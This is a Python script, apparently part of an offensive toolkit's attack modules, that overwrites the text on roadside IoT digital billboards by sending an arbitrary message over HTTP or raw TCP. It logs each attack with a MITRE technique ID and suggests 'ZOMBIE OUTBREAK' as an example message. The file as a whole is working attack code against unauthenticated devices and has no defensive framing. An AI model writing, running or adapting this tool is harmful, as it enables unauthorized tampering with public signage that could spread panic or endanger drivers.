#!/usr/bin/env python3
# modules/attacks/iot_billboard_overwriter.py

import os
import json
import socket
import time
import argparse
from datetime import datetime
import requests

LOG_FILE = "results/billboard_overwrite_log.json"
MITRE_TTP = "T1565.001"

def log_attack(ip, protocol, content):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target_ip": ip,
            "protocol": protocol,
            "payload": content,
            "ttp": MITRE_TTP
        }) + "\n")

def overwrite_http(ip, content):
    try:
        url = f"http://{ip}/set_text"
        r = requests.post(url, data={"text": content}, timeout=5)
        if r.status_code == 200:
            print(f"[✓] HTTP overwrite succeeded: {ip}")
            log_attack(ip, "http", content)
        else:
            print(f"[!] HTTP error {r.status_code}")
    except Exception as e:
        print(f"[!] HTTP overwrite failed: {e}")

def overwrite_tcp(ip, port, content):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.sendall(content.encode() + b"\n")
        sock.close()
        print(f"[✓] TCP overwrite succeeded: {ip}:{port}")
        log_attack(ip, "tcp", content)
    except Exception as e:
        print(f"[!] TCP overwrite failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Overwrite roadside IoT digital billboards with rogue messages")
    parser.add_argument("--ip", required=True, help="Billboard IP address")
    parser.add_argument("--message", required=True, help="Message to display (e.g., 'ZOMBIE OUTBREAK')")
    parser.add_argument("--protocol", choices=["http", "tcp"], required=True)
    parser.add_argument("--port", type=int, default=1337, help="TCP port (if using TCP mode)")
    args = parser.parse_args()

    if args.protocol == "http":
        overwrite_http(args.ip, args.message)
    else:
        overwrite_tcp(args.ip, args.port, args.message)
